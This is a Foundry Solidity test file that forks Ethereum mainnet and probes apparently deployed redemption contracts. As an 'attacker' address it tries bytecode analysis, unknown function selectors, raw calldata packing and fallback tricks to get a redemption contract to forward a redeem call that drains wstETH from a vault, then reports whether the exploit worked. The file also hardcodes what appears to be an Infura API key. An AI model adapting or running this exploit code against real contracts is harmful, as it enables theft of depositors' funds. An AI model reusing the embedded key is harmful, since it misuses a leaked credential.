// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract EarlyCallExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeEarlyCalls() public view {
        console.log("=== ANALYZING EARLY CALLS (OFFSETS 46 and 116) ===\n");

        bytes memory code = REDEMPTION_0.code;

        console.log("Bytecode from 0 to 150:");

        for (uint i = 0; i < 150 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            if (op == 0x35) console.log(i, "CALLDATALOAD");
            else if (op == 0x36) console.log(i, "CALLDATASIZE");
            else if (op == 0x37) console.log(i, "CALLDATACOPY");
            else if (op == 0x54) console.log(i, "SLOAD");
            else if (op == 0x55) console.log(i, "SSTORE");
            else if (op == 0xf1) console.log(i, "CALL");
            else if (op == 0xf4) console.log(i, "DELEGATECALL");
            else if (op == 0xfa) console.log(i, "STATICCALL");
            else if (op == 0x56) console.log(i, "JUMP");
            else if (op == 0x57) console.log(i, "JUMPI");
            else if (op == 0x5b) console.log(i, "JUMPDEST");
            else if (op == 0x14) console.log(i, "EQ");
            else if (op == 0x15) console.log(i, "ISZERO");
            else if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                if (size <= 4) {
                    console.log(i, "PUSH value:", val);
                } else if (size == 20) {
                    console.log(i, "PUSH20 address");
                } else {
                    console.log(i, "PUSH size:", size);
                }
            }
        }
    }

    function test_DetailedCallAnalysis() public view {
        console.log("=== DETAILED CALL ANALYSIS ===\n");

        bytes memory code = REDEMPTION_0.code;

        // CALL at offset 46
        console.log("CALL at offset 46:");
        console.log("  Looking at bytes 30-50:");
        for (uint i = 30; i <= 50 && i < code.length; i++) {
            uint8 op = uint8(code[i]);
            console.log("  ", i, "opcode:", op);
        }

        // CALL at offset 116
        console.log("\nCALL at offset 116:");
        console.log("  Looking at bytes 100-120:");
        for (uint i = 100; i <= 120 && i < code.length; i++) {
            uint8 op = uint8(code[i]);
            console.log("  ", i, "opcode:", op);
        }
    }

    function test_TryExecutePattern() public {
        console.log("=== TRYING EXECUTE PATTERN ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        vm.startPrank(attacker);

        // Try calling with (address, bytes) pattern
        bytes memory rcRedeemCall = abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker);

        console.log("Trying execute patterns:");

        // execute(address,bytes)
        (bool s1,) = REDEMPTION_0.call(
            abi.encodeWithSignature("execute(address,bytes)", REDEMPTION_CONTROLLER, rcRedeemCall)
        );
        console.log("execute(address,bytes):", s1);

        // call(address,bytes)
        (bool s2,) = REDEMPTION_0.call(
            abi.encodeWithSignature("call(address,bytes)", REDEMPTION_CONTROLLER, rcRedeemCall)
        );
        console.log("call(address,bytes):", s2);

        // Raw - just pack address and data at certain offsets
        bytes memory rawCall = abi.encodePacked(
            bytes4(0x12345678), // fake selector
            REDEMPTION_CONTROLLER,
            rcRedeemCall
        );
        (bool s3,) = REDEMPTION_0.call(rawCall);
        console.log("raw packed call:", s3);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** EXECUTE PATTERN EXPLOIT WORKED! ***");
        }
    }

    function test_CheckSelector4cdad506() public {
        console.log("=== CHECKING SELECTOR 0x4cdad506 ===\n");

        // This selector appeared in REDEMPTION_0's list
        // Let's see if it takes address + bytes

        vm.startPrank(attacker);

        bytes memory rcRedeemCall = abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker);

        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSelector(bytes4(0x4cdad506), REDEMPTION_CONTROLLER, rcRedeemCall)
        );
        console.log("0x4cdad506(RC, redeemCall):", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        // Try with just address
        (bool s2, bytes memory d2) = REDEMPTION_0.call(
            abi.encodeWithSelector(bytes4(0x4cdad506), attacker)
        );
        console.log("0x4cdad506(attacker):", s2);
        if (s2 && d2.length >= 32) {
            console.log("  Returns:", uint256(bytes32(d2)));
        }

        vm.stopPrank();
    }

    function test_CheckAllUnknownSelectors() public {
        console.log("=== CHECKING ALL UNKNOWN SELECTORS ===\n");

        // Selectors we haven't identified:
        // 0xed45b661, 0xeda72134, 0xb2118a8d, 0xcff50c6e
        // 0x900fd1ed, 0x9307e802, 0xa82b69ff
        // 0x3a2ef9df, 0x458f5815, 0x51cbf345, 0x5f8b5592
        // 0x3f14c193, 0x196e6b1d
        // 0x04824e70, 0x1650cf97, 0x192a8e86, 0x4cdad506
        // 0xba087652, 0x1f240274, 0x035faf82

        bytes4[] memory toCheck = new bytes4[](10);
        toCheck[0] = bytes4(0xed45b661);
        toCheck[1] = bytes4(0xeda72134);
        toCheck[2] = bytes4(0xcff50c6e);
        toCheck[3] = bytes4(0x900fd1ed);
        toCheck[4] = bytes4(0x9307e802);
        toCheck[5] = bytes4(0xa82b69ff);
        toCheck[6] = bytes4(0x3a2ef9df);
        toCheck[7] = bytes4(0x458f5815);
        toCheck[8] = bytes4(0x51cbf345);
        toCheck[9] = bytes4(0x3f14c193);

        console.log("Testing with (address, bytes) pattern:");

        bytes memory rcRedeemCall = abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker);

        vm.startPrank(attacker);

        for (uint i = 0; i < toCheck.length; i++) {
            (bool s1,) = REDEMPTION_0.call(
                abi.encodeWithSelector(toCheck[i], REDEMPTION_CONTROLLER, rcRedeemCall)
            );
            if (s1) {
                console.log("SUCCESS:");
                console.logBytes4(toCheck[i]);
            }
        }

        vm.stopPrank();
    }

    function test_CheckProxyPattern() public view {
        console.log("=== CHECKING PROXY PATTERN ===\n");

        // The early CALLs might be a minimal proxy pattern
        // Let's decode the bytecode structure

        bytes memory code = REDEMPTION_0.code;

        // Typical minimal proxy: CALLDATALOAD + CALL to implementation
        // The implementation address might be at offset 0 in calldata

        console.log("First 50 bytes hex:");
        for (uint i = 0; i < 50 && i < code.length; i++) {
            if (i % 10 == 0) console.log("Offset", i, ":");
        }

        // Check if offset 26 is loading calldata offset 0 (the target address)
        // CALLDATALOAD with 0 push before it would load bytes 0-32 of calldata
        if (code.length > 26) {
            console.log("\nBytecode at 26:", uint8(code[26]));
            if (uint8(code[26]) == 0x35) {
                console.log("  Confirmed CALLDATALOAD at 26");
                // Check what's before it
                if (code.length > 25) {
                    console.log("  Bytecode at 25:", uint8(code[25]));
                }
            }
        }
    }

    function test_TryRawCalldataExploit() public {
        console.log("=== TRYING RAW CALLDATA EXPLOIT ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        vm.startPrank(attacker);

        // If CALLDATALOAD at offset 26 loads the call target
        // We need to pack: [32-byte address] + [rest of calldata]

        bytes memory rcRedeemCall = abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker);

        // Try: first 32 bytes = RC address (padded), then calldata
        bytes memory exploit1 = abi.encodePacked(
            bytes32(uint256(uint160(REDEMPTION_CONTROLLER))),
            rcRedeemCall
        );
        (bool s1,) = REDEMPTION_0.call(exploit1);
        console.log("Raw 32-byte address prefix:", s1);

        // Try: first 20 bytes = RC address, then calldata
        bytes memory exploit2 = abi.encodePacked(
            REDEMPTION_CONTROLLER,
            rcRedeemCall
        );
        (bool s2,) = REDEMPTION_0.call(exploit2);
        console.log("Raw 20-byte address prefix:", s2);

        // Try: 4-byte selector + address + calldata
        bytes memory exploit3 = abi.encodePacked(
            bytes4(0x00000000),
            bytes32(uint256(uint160(REDEMPTION_CONTROLLER))),
            rcRedeemCall
        );
        (bool s3,) = REDEMPTION_0.call(exploit3);
        console.log("Selector + 32-byte address:", s3);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** RAW CALLDATA EXPLOIT WORKED! ***");
        }
    }

    function test_FallbackAnalysis() public {
        console.log("=== FALLBACK ANALYSIS ===\n");

        // Check if calling with unknown selector triggers fallback
        // that might forward to an address from calldata

        vm.startPrank(attacker);

        bytes memory rcRedeemCall = abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker);

        // Try with non-existent selector
        bytes4 fakeSel = bytes4(0xdeadbeef);

        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodePacked(fakeSel, bytes32(uint256(uint160(REDEMPTION_CONTROLLER))), rcRedeemCall)
        );
        console.log("Fake selector + RC + redeem:", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        // Try completely empty calldata
        (bool s2,) = REDEMPTION_0.call("");
        console.log("Empty calldata:", s2);

        // Try just the address
        (bool s3,) = REDEMPTION_0.call(abi.encodePacked(REDEMPTION_CONTROLLER));
        console.log("Just RC address:", s3);

        vm.stopPrank();
    }
}
